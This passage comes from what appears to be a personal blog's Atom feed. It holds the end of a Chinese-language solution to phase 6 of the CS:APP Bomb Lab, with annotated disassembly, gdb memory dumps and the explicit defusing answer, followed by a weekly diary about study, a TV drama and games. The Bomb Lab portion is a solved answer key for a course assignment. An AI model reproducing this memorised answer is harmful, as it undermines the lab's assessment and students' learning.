&lt;+32&gt;:mov    %r13,%rbp                &#x2F;&#x2F;rbp&#x3D;r13 外循环1起始</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:mov    0x0(%r13),%eax              </span><br><span class="line">   0x000000000040111b &lt;+39&gt;:sub    $0x1,%eax                &#x2F;&#x2F;ax&#x3D;(r13)-1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:cmp    $0x5,%eax                &#x2F;&#x2F;ax与5比较</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;    &#x2F;&#x2F;ax&gt;5 炸</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:add    $0x1,%r12d               &#x2F;&#x2F;r12++  r12为外循环索引</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:cmp    $0x6,%r12d               &#x2F;&#x2F;比较r12与6</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;    &#x2F;&#x2F;循环6次 结束转95(外循环 1)</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:mov    %r12d,%ebx</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:movslq %ebx,%rax                &#x2F;&#x2F;里循环起始</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:mov    (%rsp,%rax,4),%eax       &#x2F;&#x2F;ax &#x3D; 栈[r12]</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:cmp    %eax,0x0(%rbp)           &#x2F;&#x2F;比较(r13)与ax</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;    &#x2F;&#x2F;不等于 转81 等于 炸</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:add    $0x1,%ebx                &#x2F;&#x2F;bx++ bx为里循环索引</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:cmp    $0x5,%ebx                </span><br><span class="line">   0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;    &#x2F;&#x2F;若bx&lt;&#x3D;5, 即数2~数5 循环65 (里循环 2)</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:add    $0x4,%r13                &#x2F;&#x2F;现在数6,r13&#x3D;下一个数字栈地址</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;    &#x2F;&#x2F;转32(外循环) </span><br><span class="line">   &#x2F;&#x2F;循环12: 外循环保证每个数字均∈[1,6] , 里循环保证数字各不相同</span><br><span class="line">   &#x2F;&#x2F;方便起见, 称输入的6个数字为a[i],i∈[0,5]</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:lea    0x18(%rsp),%rsi          &#x2F;&#x2F;rsi&#x3D;栈+24 (栈0~20存储数1-6)</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:mov    %r14,%rax                &#x2F;&#x2F;ax&#x3D;栈0地址</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:mov    $0x7,%ecx                &#x2F;&#x2F;cx&#x3D;7</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:mov    %ecx,%edx                &#x2F;&#x2F;dx &#x3D; cx       循环3起始</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:sub    (%rax),%edx              &#x2F;&#x2F;dx -&#x3D; *ax</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:mov    %edx,(%rax)              &#x2F;&#x2F;*ax &#x3D; dx</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:add    $0x4,%rax                &#x2F;&#x2F;ax指向下一个数字  ax为循环3索引</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:cmp    %rsi,%rax                &#x2F;&#x2F;如果ax!&#x3D;栈+24</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;   &#x2F;&#x2F;转108 循环3</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:mov    $0x0,%esi                &#x2F;&#x2F;si &#x3D; 0   </span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;   &#x2F;&#x2F;转163         循环3结束</span><br><span class="line">   &#x2F;&#x2F;循环3: 使每数1-数6与原地对7取补(1-&gt;6,2-&gt;5) 称取补后的数为b[i]&#x3D;7-a[i]</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:mov    0x8(%rdx),%rdx           &#x2F;&#x2F;dx +&#x3D; 0x8</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:add    $0x1,%eax                &#x2F;&#x2F;ax++</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:cmp    %ecx,%eax                &#x2F;&#x2F;比较数补与ax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;   &#x2F;&#x2F;不等 转130</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;   &#x2F;&#x2F;等 转148</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:mov    $0x6032d0,%edx           &#x2F;&#x2F;dx &#x3D; 0x6032d0</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:mov    %rdx,0x20(%rsp,%rsi,2)   &#x2F;&#x2F;(栈+2*si+32)&#x3D;dx</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:add    $0x4,%rsi                &#x2F;&#x2F;si+&#x3D;4         si作为循环4索引</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:cmp    $0x18,%rsi               &#x2F;&#x2F;若si&#x3D;&#x3D;24 </span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;   &#x2F;&#x2F;转183         循环4结束</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:mov    (%rsp,%rsi,1),%ecx       &#x2F;&#x2F;cx &#x3D; (栈+si)  循环4起始 </span><br><span class="line">   0x000000000040119a &lt;+166&gt;:cmp    $0x1,%ecx                &#x2F;&#x2F;cx 与 1比较</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;   &#x2F;&#x2F;若cx&lt;&#x3D;1 转143 </span><br><span class="line">   0x000000000040119f &lt;+171&gt;:mov    $0x1,%eax                &#x2F;&#x2F;ax &#x3D; 1</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:mov    $0x6032d0,%edx           &#x2F;&#x2F;dx &#x3D; 0x6032d0</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;   &#x2F;&#x2F;转130</span><br><span class="line">   &#x2F;&#x2F;循环4: 使(栈32+8*(i-1))&#x3D;0x6032d0+b[i]*16 </span><br><span class="line">   &#x2F;&#x2F;称地址 栈32+8*(i-1) 为d0~d5</span><br><span class="line">   &#x2F;&#x2F;称其中储存的数据,即0x6032d0+b[i]*16,为k0~k5</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:mov    0x20(%rsp),%rbx          &#x2F;&#x2F;bx &#x3D; k[0]</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:lea    0x28(%rsp),%rax          &#x2F;&#x2F;ax &#x3D; &amp;k[1] &#x3D; d[0]</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:lea    0x50(%rsp),%rsi          &#x2F;&#x2F;si &#x3D; &amp;栈+0x50 &#x3D; d[6]</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:mov    %rbx,%rcx                &#x2F;&#x2F;cx &#x3D; bx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:mov    (%rax),%rdx              &#x2F;&#x2F;dx &#x3D; (ax)  循环5起始</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:mov    %rdx,0x8(%rcx)           &#x2F;&#x2F;cx+8储存dx 例如 k0+8储存k1 k4+8储存k5</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:add    $0x8,%rax                &#x2F;&#x2F;ax &#x3D; &amp;(下一个)</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;   &#x2F;&#x2F;循环5结束 转222</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:mov    %rdx,%rcx                &#x2F;&#x2F;rcx &#x3D; k5  </span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;   &#x2F;&#x2F;转201</span><br><span class="line">   &#x2F;&#x2F;循环5:  k0+8储存k1 v4+8储存k5</span><br><span class="line">   &#x2F;&#x2F;若将k[i]作为地址,指向数字v[i]</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:movq   $0x0,0x8(%rdx)           &#x2F;&#x2F;k5+8储存0</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:mov    $0x5,%ebp                &#x2F;&#x2F;bp&#x3D;5  作为索引</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:mov    0x8(%rbx),%rax           &#x2F;&#x2F;ax &#x3D; (k[i]+8) &#x3D; k[i+1]   循环6起始</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:mov    (%rax),%eax              &#x2F;&#x2F;ax &#x3D; (k[i+1]) &#x3D; v[i+1]</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:cmp    %eax,(%rbx)              &#x2F;&#x2F;比较(rbx) 与 ax , bx&#x3D;k[i], (bx)&#x3D;v[i]</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;   &#x2F;&#x2F;若(rbx)&gt;ax 转 250</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:mov    0x8(%rbx),%rbx           &#x2F;&#x2F;bx+&#x3D;8</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:sub    $0x1,%ebp                &#x2F;&#x2F;bp-1  </span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;   &#x2F;&#x2F;循环6</span><br><span class="line">   &#x2F;&#x2F;循环6: 保证v[i]&gt;v[i+1]</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:add    $0x50,%rsp               </span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:retq</span><br></pre></td></tr></table></figure><p>注: </p><ul><li>代码中一共涉及到6个循环体</li><li>我们称输入的原数为a[i], i∈[0,5]</li><li>循环1, 循环2 为一个二重嵌套循环, 循环1为外循环, 循环2为里循环</li><li>循环1保证输入的每个数字都属于[1,6]</li><li>循环2保证输入的每个数字两两相异</li><li>循环3 使每数1-数6与原地对7取补(1-&gt;6,2-&gt;5) 称取补后的数为b[i]=7-a[i]</li><li>循环4: <ul><li>对于每个i, 称地址 $栈32+8\times(i-1)$ 为d[0]~d[5] </li><li>对于每个i, 称数据 $0x6032d0+b[i]\times 16$ 为k[0]-k[5]</li><li>在 d[i] 中储存 k[i]</li><li>k[i] 也可以作为地址, 对应数据成为v[i]</li></ul></li><li>循环5:在<code>k[i] + 8</code> 处储存 <code>k[i+1],</code> 这一步是为了后续操作的方便</li><li>循环6: 必须保证<code>v[i]&gt;v[i+1]</code></li></ul><h4 id="注解p6-1"><a href="#注解p6-1" class="headerlink" title="注解p6_1"></a>注解p6_1</h4><p>0x6032d0附近储存的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print *(int*) (0x6032d0+16*0)</span><br><span class="line">$83 &#x3D; 332</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*1)</span><br><span class="line">$84 &#x3D; 168</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*2)</span><br><span class="line">$85 &#x3D; 924</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*3)</span><br><span class="line">$86 &#x3D; 691</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*4)</span><br><span class="line">$88 &#x3D; 477</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*5)</span><br><span class="line">$89 &#x3D; 443</span><br></pre></td></tr></table></figure><h4 id="注解p6-2"><a href="#注解p6-2" class="headerlink" title="注解p6_2"></a>注解p6_2</h4><p>因此, 若使得v[0]~v[5]依次为924,691,477,443,332,168</p><p>则b[i]-1 应依次为: 2,3,4,5,0,1</p><p>原值a[i] 应依次为: 4,3,2,1,6,5</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>炸弹实验室从6月25日开始, 至7月1日凌晨两点完成. </p><p>掌握了gdb调试方法, 和简单汇编语言的阅读能力, 对其中的数据储存, 数据基本计算, 函数调用, 分支与循环的体现, 栈与内存的分配等内容有了基本了解. </p><p>后来在参考其他博客的笔记时发现还有一个隐藏炸弹. 先放置吧, 有时间会来填坑.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是我在2020年6月26日~7月1日完成的Bomb Lab的题解与笔记&lt;/p&gt;
&lt;p&gt;炸弹实验室是CS:APP 配套实验中的第二个实验, 通过对二进制文件反汇编来分析获得拆除炸弹的密码.&lt;/p&gt;
&lt;p&gt;本文显式地包含答案, 如果你想自己解决,不建议使用本文.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab2-BombLab&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;对应Github仓库 点我&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="乘龙术" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/"/>
    
      <category term="CSAPP" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/CSAPP/"/>
    
    
      <category term="读书笔记:技术" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF/"/>
    
      <category term="CSAPP" scheme="http://yoursite.com/tags/CSAPP/"/>
    
      <category term="Lab" scheme="http://yoursite.com/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>时与光W_202006-4</title>
    <link href="http://yoursite.com/2020/06/28/%E6%97%B6%E4%B8%8E%E5%85%89W_202006-4/"/>
    <id>http://yoursite.com/2020/06/28/%E6%97%B6%E4%B8%8E%E5%85%89W_202006-4/</id>
    <published>2020-06-28T12:41:22.000Z</published>
    <updated>2020-06-28T14:16:47.560Z</updated>
    
    <content type="html"><![CDATA[<p>2020年6月22日 ~ 28日.</p><p>开始个人小结计划</p><p>学习 CSAPP </p><p>追剧, 玩游戏</p><a id="more"></a><h2 id="时与光-个人小结计划"><a href="#时与光-个人小结计划" class="headerlink" title="时与光:个人小结计划"></a>时与光:个人小结计划</h2><p>听说每天坚持写技术博客有利于知识巩固与技能加深, 自觉没有每天坚持的能力, 想了个折中的办法: 以一周为阶段定期总结. 当然, 每月月底, 每半年, 每年也要整理记录! </p><p>主要内容希望自己能够以技术学习, 生活记录为主. 反正也不会有别人看, 就写的简略且随性一些. </p><p><strong>以下是每次小结的规范:</strong></p><ol><li>小结分为: 周记, 月记, 半年总结, 年度总结 四种, 后缀分别以<code>w,m,h,y</code>标识.</li><li>命名格式例: <ol><li>周记: <code>时与光W_202006-4</code> 末位数字代表本月第几周(周日为准)</li><li>月记: <code>时与光M_202006</code></li><li>半年记: <code>时与光H_2020上半年</code></li><li>年度记: <code>时与光Y_2020年度总结</code></li></ol></li><li>内容包括: <ol><li>技术学习成果与产出总结</li><li>记录生活, 如旅游 读书 观影 游戏</li><li>突如其来的想法</li><li>下一阶段的展望</li></ol></li></ol><h2 id="学习CSAPP"><a href="#学习CSAPP" class="headerlink" title="学习CSAPP"></a>学习CSAPP</h2><p>项目地址:</p><p><a href="https://github.com/luy-0/CS-APP-LABs" target="_blank" rel="noopener">https://github.com/luy-0/CS-APP-LABs</a></p><p>对CSAPP这本书垂涎已久, 趁着疫情的期末大把空闲时间和两位同学组队学习CSAPP以及CMU的15-213课程. 更多学习情况参看README部分.</p><p>本周着重于完成机器级别编程部分, 以及课程配套实验中的Bomb Lab, 这是一个通过 gdb 查看可执行文件的汇编代码, 并且推导出炸弹拆除的密钥. 在这几天习得了基本的汇编代码阅读能力, gdb 的基本运用能力, 对C计算机底层运算的实现有了更深的理解. </p><p>这个Lab真是让人又爱又恨, 每拆除一个炸弹的时候成就感满满, 但是对着汇编代码死活瞪不出逻辑的暴躁和无奈…</p><p>机器级别编程 是指 使用汇编代码完成函数操作. 主要学习内容包括 控制机器执行, 执行过程 数据的存储(数组 结构 联合) 以及其他进阶部分. 其中关于缓存区溢出, 栈攻击, 浮点代码等部分掌握的不好.</p><h2 id="追剧"><a href="#追剧" class="headerlink" title="追剧"></a>追剧</h2><p>这一周在追《隐蔽的角落》 . 改编自紫金陈的推理小说《坏小孩》，讲述了在沿海小城三个孩子(朱朝阳, 岳普, 严良) 在景区游玩时无意间拍摄记录了一次谋杀(张东升, 秦昊饰)，想借机敲诈来筹钱，以及随后发生的一连串的故事。大结局播完豆瓣评分依旧为9.0</p><p>主要是周围同学都在追哈哈哈, 感叹国产网剧真的很成熟了, 前几集导演对于节奏把握的很好, 中间叙事稍有平淡, 最后一部分还没看😂  配乐挺用心, 虽然我听不懂后现代, 但是还是有被情绪感染到. 在展现上制片组的细致程度令人感动, 例如张东升海夜追朝阳时对着脚步印, 例如试卷和板书上的题目真的是初中知识点 , 竟然有一点点对着美剧扣细节的感觉了. 演员也实力诠释, 秦昊的演技令人背后发凉, 小朋友的演技也很稳啊~ 朝阳那种说的少想得多的内向好学生非常真实, 普普的可爱是真的戏里戏外的可爱 ,就是太机灵懂事了, 牛逼的让人心疼(话说我怎么总觉得她最后要黑化一类的?) 严良其实没有很好地演出想象里的小痞子气, 缺点那种坏味.一部很优秀的国产剧, 拯救了我被言情耽改剧摧毁的信心~ (没错我就是指ssss和cql)</p><p>希望结局能够依旧精彩吧! </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/XGYW%25K%7DKW%40MFX%7BQNNHBI95W.jpg" alt=""></p><h2 id="玩游戏"><a href="#玩游戏" class="headerlink" title="玩游戏"></a>玩游戏</h2><p>嗯…最近又入了平安京的坑, MOBA真香:dog: 不过打了一周上了少属就没啥动力了… 快乐咸鱼佛系游戏, 竞技游戏嘛 心态放好就行了~</p><h2 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h2><p>继续CSAPP </p><p>开始刷LC</p><p>控制每日游戏时长</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年6月22日 ~ 28日.&lt;/p&gt;
&lt;p&gt;开始个人小结计划&lt;/p&gt;
&lt;p&gt;学习 CSAPP &lt;/p&gt;
&lt;p&gt;追剧, 玩游戏&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
</feed>
